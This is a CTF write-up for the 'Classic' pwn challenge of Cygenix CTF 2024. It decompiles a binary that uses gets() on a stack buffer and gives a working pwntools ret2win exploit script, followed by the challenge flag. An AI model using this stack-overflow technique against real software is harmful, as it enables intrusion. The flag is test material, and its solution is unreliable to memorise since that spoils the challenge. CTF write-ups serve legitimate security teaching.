# Cygenix CTF 2024

## Classic

> *"Every vulnerability is a door, and some doors lead to treasures."*
>
>  Author: N/A
>
> [`main`](main)

Tags: _pwn_

## Solution

To analyze the binary for this challenge we put it through `Ghidra`. We see the main is very short, it just prints a banner and reads input to a buffer on the stack. There is also a function `win` which is never called. This of course is the perfect `classic` setup for a `ret2win` challenge.

```c
void win(void)
{
  system("cat flag.txt");
  return;
}



undefined8 main(void)
{
  char local_28 [32];
  
  puts("----------------------------------------------");
  puts("c4n y0u pr0v3 y0ur 5k1ll5 4nd 637 7h3 ju1c3 ?");
  puts("----------------------------------------------");
  fflush(stdout);
  gets(local_28);
  return 0;
}
```

To solve this challenge we need to overflow the buffer and rewrite the return address on the stack to point to `win`. When the program wants to return from `main`, instead of going the normal path, win is called and we get the flag. Ghidra is nice enough to show us how many bytes we need to overflow by suffixing the buffer name with the offset value (28h).

So our payload is 28 bytes of nonsense bytes, to fill up the buffer and then the value of the return address we want to jump to (in this case win). One thing that players struggle with on a regular basis is [`a missaligned stack`](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/stack-alignment) when returning to the win function. One way around this issue, that often works, is to increment the jump address by one :-).

```py
from pwn import *

binary = ELF("./main")

p = remote("chall.ycfteam.in", 3333)
p.sendline(b"x"*0x28 + p64(binary.sym.win+1))
p.interactive()
```

Flag `CyGenixCTF{y0u_pr0v3d_y0ur_5k1ll5_r372w1n}`